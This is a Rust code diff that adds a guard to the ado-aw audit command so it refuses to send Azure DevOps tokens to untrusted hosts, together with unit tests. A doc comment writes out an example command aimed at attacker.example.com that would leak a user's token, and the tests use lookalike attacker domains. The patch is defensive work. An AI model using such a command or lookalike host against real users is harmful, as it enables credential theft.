@@ -311,19 +311,99 @@ async fn resolve_audit_context(
     project: Option<&str>,
     parsed: &ParsedBuildRef,
 ) -> Result<AdoContext> {
+    // Best-effort resolution of the trusted ADO context from --org / --project
+    // and the local git remote. These are the only sources we trust to decide
+    // whether the host derived from a user-supplied URL is safe to authenticate
+    // against.
+    let trusted_ctx = resolve_ado_context(cwd, org, project).await.ok();
+
+    if let Some(url_host) = parsed.host.as_deref() {
+        validate_audit_url_host(url_host, trusted_ctx.as_ref())?;
+    }
+
     if parsed.org.is_some() && parsed.project.is_some() && parsed.host.is_some() {
-        let mut ctx = resolve_ado_context(cwd, org, project)
-            .await
-            .unwrap_or_else(|_| AdoContext {
-                org_url: String::new(),
-                project: String::new(),
-                repo_name: String::new(),
-            });
+        let mut ctx = trusted_ctx.unwrap_or_else(|| AdoContext {
+            org_url: String::new(),
+            project: String::new(),
+            repo_name: String::new(),
+        });
         apply_parsed_context_overrides(&mut ctx, parsed);
         return Ok(ctx);
     }
 
-    resolve_ado_context(cwd, org, project).await
+    trusted_ctx.ok_or_else(|| {
+        anyhow::anyhow!(
+            "Could not determine ADO context: pass a full build URL, or pass --org and --project, or run from inside an ADO git repository."
+        )
+    })
+}
+
+/// Refuse to authenticate against an arbitrary host derived from a
+/// user-supplied build URL.
+///
+/// Without this check, a user social-engineered into running
+/// `ado-aw audit https://attacker.example.com/Collection/Project/_build/results?buildId=1`
+/// would silently send their ADO PAT (from `--pat` /
+/// `AZURE_DEVOPS_EXT_PAT` / az CLI fallback) to the attacker over HTTP
+/// Basic Auth.
+///
+/// Trust rules:
+/// - Microsoft-managed cloud hosts (`dev.azure.com`, `*.visualstudio.com`)
+///   are always allowed.
+/// - Any other host (typically on-prem ADO Server) is allowed only when it
+///   matches the host of `trusted_ctx.org_url`, which itself was resolved
+///   from either `--org` or the local git remote — both explicit, locally
+///   controlled trust anchors.
+fn validate_audit_url_host(url_host: &str, trusted_ctx: Option<&AdoContext>) -> Result<()> {
+    if is_microsoft_cloud_host(url_host) {
+        return Ok(());
+    }
+
+    let trusted_host = trusted_ctx.and_then(|ctx| host_from_org_url(&ctx.org_url));
+    match trusted_host {
+        Some(expected) if expected.eq_ignore_ascii_case(url_host) => Ok(()),
+        Some(expected) => anyhow::bail!(
+            "Refusing to send ADO credentials to host '{}': it does not match \
+             the expected ADO host '{}' (resolved from --org / git remote). \
+             If this on-prem host is intentional, pass --org pointing at it \
+             (e.g. --org https://{}/<collection>) to authorize.",
+            url_host,
+            expected,
+            url_host
+        ),
+        None => anyhow::bail!(
+            "Refusing to send ADO credentials to unrecognized host '{}'. \
+             Only Microsoft-managed cloud hosts (dev.azure.com, *.visualstudio.com) \
+             are trusted by default. For an on-prem host, pass \
+             --org https://{}/<collection> to confirm this host is trusted.",
+            url_host,
+            url_host
+        ),
+    }
+}
+
+fn is_microsoft_cloud_host(host: &str) -> bool {
+    let host = host.to_ascii_lowercase();
+    if host == "dev.azure.com" {
+        return true;
+    }
+    // Require `<non-empty-label>.visualstudio.com`. `strip_suffix` on a
+    // bare-suffix string like ".visualstudio.com" yields an empty prefix,
+    // which we explicitly reject.
+    match host.strip_suffix(".visualstudio.com") {
+        Some(prefix) => !prefix.is_empty(),
+        None => false,
+    }
+}
+
+fn host_from_org_url(org_url: &str) -> Option<String> {
+    if org_url.is_empty() {
+        return None;
+    }
+    url::Url::parse(org_url)
+        .ok()?
+        .host_str()
+        .map(str::to_string)
 }
 
 fn apply_parsed_context_overrides(ctx: &mut AdoContext, parsed: &ParsedBuildRef) {
@@ -740,5 +820,132 @@ mod tests {
             agent_only
         ));
         assert!(!artifact_matches_selected("safe_outputs", agent_only));
+    }
+
+    // ── validate_audit_url_host: PAT exfiltration guard ───────────────────
+
+    fn trusted(org_url: &str) -> AdoContext {
+        AdoContext {
+            org_url: org_url.to_string(),
+            project: String::new(),
+            repo_name: String::new(),
+        }
+    }
+
+    #[test]
+    fn validate_host_accepts_dev_azure_com_without_trusted_context() {
+        validate_audit_url_host("dev.azure.com", None).expect("cloud host is always trusted");
+    }
+
+    #[test]
+    fn validate_host_accepts_dev_azure_com_case_insensitively() {
+        validate_audit_url_host("Dev.Azure.Com", None).expect("cloud host match is case-insensitive");
+    }
+
+    #[test]
+    fn validate_host_accepts_visualstudio_com_subdomain() {
+        validate_audit_url_host("myorg.visualstudio.com", None)
+            .expect("legacy visualstudio.com host is trusted");
+    }
+
+    #[test]
+    fn validate_host_rejects_lookalike_attacker_visualstudio_com_path() {
+        // Must be host-suffix match, not substring match — a host like
+        // "visualstudio.com.attacker.example" or
+        // "attacker-visualstudio.com" must not be accepted.
+        let attacker = "visualstudio.com.attacker.example";
+        let err = validate_audit_url_host(attacker, None)
+            .expect_err("attacker-controlled host with visualstudio.com prefix must be rejected");
+        assert!(
+            err.to_string().contains("Refusing to send"),
+            "expected refusal message, got: {err}"
+        );
+    }
+
+    #[test]
+    fn validate_host_rejects_arbitrary_host_without_trusted_context() {
+        let err = validate_audit_url_host("attacker.example.com", None)
+            .expect_err("on-prem host with no trusted context must be rejected");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("attacker.example.com"),
+            "error should name the rejected host, got: {msg}"
+        );
+        assert!(
+            msg.contains("--org"),
+            "error should suggest --org as the remediation, got: {msg}"
+        );
+    }
+
+    #[test]
+    fn validate_host_rejects_host_mismatch_against_trusted_context() {
+        let ctx = trusted("https://onprem-real.example.com/MyCollection");
+        let err = validate_audit_url_host("attacker.example.com", Some(&ctx))
+            .expect_err("URL host that doesn't match --org / git remote must be rejected");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("attacker.example.com"),
+            "error should name the rejected host, got: {msg}"
+        );
+        assert!(
+            msg.contains("onprem-real.example.com"),
+            "error should name the expected host, got: {msg}"
+        );
+    }
+
+    #[test]
+    fn validate_host_accepts_matching_onprem_host() {
+        let ctx = trusted("https://onprem.example.com/MyCollection");
+        validate_audit_url_host("onprem.example.com", Some(&ctx))
+            .expect("on-prem host matching --org / git remote must be accepted");
+    }
+
+    #[test]
+    fn validate_host_accepts_matching_onprem_host_case_insensitively() {
+        let ctx = trusted("https://OnPrem.Example.Com/MyCollection");
+        validate_audit_url_host("onprem.example.com", Some(&ctx))
+            .expect("on-prem host match must be case-insensitive");
+    }
+
+    #[test]
+    fn validate_host_rejects_unrelated_host_even_with_cloud_trusted_context() {
+        // A user with a dev.azure.com trusted context is still protected
+        // against URLs pointing at an unrelated on-prem host.
+        let ctx = trusted("https://dev.azure.com/my-org");
+        let err = validate_audit_url_host("attacker.example.com", Some(&ctx))
+            .expect_err("must reject attacker host even when trusted context is cloud");
+        assert!(
+            err.to_string().contains("attacker.example.com"),
+            "error should name the rejected host"
+        );
+    }
+
+    #[test]
+    fn is_microsoft_cloud_host_classifies_correctly() {
+        assert!(is_microsoft_cloud_host("dev.azure.com"));
+        assert!(is_microsoft_cloud_host("DEV.AZURE.COM"));
+        assert!(is_microsoft_cloud_host("myorg.visualstudio.com"));
+        assert!(is_microsoft_cloud_host("MyOrg.VisualStudio.Com"));
+
+        assert!(!is_microsoft_cloud_host(""));
+        assert!(!is_microsoft_cloud_host("dev.azure.com.attacker.example"));
+        assert!(!is_microsoft_cloud_host("notdev.azure.com"));
+        assert!(!is_microsoft_cloud_host("visualstudio.com"));
+        assert!(!is_microsoft_cloud_host(".visualstudio.com"));
+        assert!(!is_microsoft_cloud_host("xvisualstudio.com"));
+    }
+
+    #[test]
+    fn host_from_org_url_extracts_and_handles_empty() {
+        assert_eq!(
+            host_from_org_url("https://dev.azure.com/my-org").as_deref(),
+            Some("dev.azure.com")
+        );
+        assert_eq!(
+            host_from_org_url("https://onprem.example.com/Coll").as_deref(),
+            Some("onprem.example.com")
+        );
+        assert_eq!(host_from_org_url(""), None);
+        assert_eq!(host_from_org_url("not a url"), None);
     }
 }
